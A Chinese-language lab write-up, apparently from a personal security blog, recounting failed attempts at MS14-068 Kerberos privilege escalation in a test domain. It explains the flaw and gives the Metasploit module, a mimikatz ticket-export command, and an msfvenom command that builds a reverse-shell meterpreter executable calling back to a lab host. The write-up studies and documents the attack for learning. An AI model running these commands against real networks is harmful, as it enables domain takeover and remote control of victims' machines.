ailx10说：这篇是2022年1月之前写的，后来又改过。这篇 Kerberos 提权，我试了两套 MS14-068 路线。按用户 SID、口令和域控生成票据，导入以后访问仍不通，再换模块、转格式，最后还是出现 ticket application failed。理论图读起来很顺，实际环境却把我拦在好几处，索性把失败过程完整记下来。它让我意识到，少一个特定补丁不代表环境就符合全部条件，已有管理员连接也不能拿来代替普通用户提权的证明。没跑通时最有用的，往往是把每次输入和所处身份写清，而不是只换工具。

MS14-068按用户SID密码与DC生成票据，pykek注入后无法访问IPC；追加MSF生成格式转换后导入仍Kerberos ticket application failed。

## 技术条件与证据边界

K8S密钥中心应KDC，未装一个KB不等于无后续修补；生成x86而handler x64不匹配，已有管理员IPC不是漏洞升权，两实验均失败。

## 历史实验与原文记录

- 域内任意用户名
- SID
- 密码
- 域控IP地址

反正我觉得这本书上，对这一块讲的不咋滴，至少我没看到特权体现在哪？不知道大家怎么看？不过放心，这个知名的漏洞，肯定还会有后续的实验的\~

漏洞原理：

- 用户向KDC（密钥分发中心）申请TGT（身份凭证）时
- 用户可以伪造自己的票据
- 如果票据声明自己有域管理员权限
- 而KDC在处理该票据时未验证票据的签名
- 那么返回给用户的TGT就拥有域管理员权限
- 用户将有域管理员权限的TGT发送到TGS（票据授权服务）
- 就会获得特权ST（服务票据）
- 于是可以访问域内的一切资源

## 一、在metasploit中实验

- 利用ms14-068漏洞
- 生成`20200926141524_default_192.168.160.143_windows.kerberos_231623.bin`
- 需要通过mimikatz进行一下格式转换

```
use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
```

![](/notes-assets/c9766e0513f0e2aaf040.jpg)

## 二、在mimikatz中进行格式转换

- 获得`kirbi`格式的文件
- 留着后面提权用

```
kerberos::clist "20200926141524_default_192.168.160.143_windows.kerberos_231623.bin" /export
```

![](/notes-assets/32f245f448b9275a77c3.jpg)

## 三、生成一个反向shell的木马

- 获得`hack.exe`

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.160.140 LPORT=5555 -f exe > hack.exe
```

![](/notes-assets/0c2869d2bd58ffde1566.webp)

- 通过metasploit监听5555端口

```

set lhost 0.0.0.0
```
